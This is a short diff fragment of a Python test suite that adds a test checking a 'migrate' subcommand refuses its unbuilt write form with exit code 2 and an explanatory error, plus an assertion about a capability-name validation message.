+        self.assertIn("FAIL: provides must equal the capability names of adds.capabilities", out)
+
+
+class Migrate(LibraryBase):
+    def test_the_write_form_stays_not_built_and_says_why(self):
+        rc, out, err = self.q("migrate", "claude")
+        self.assertEqual((rc, out), (2, ""))
+        self.assertIn("not built yet; use --dry-run", err)
+        self.assertIn("its definitions are schema 2 already", err)
+
+
 class Review(unittest.TestCase):
     """lib/conformance/review.py on its own."""
 
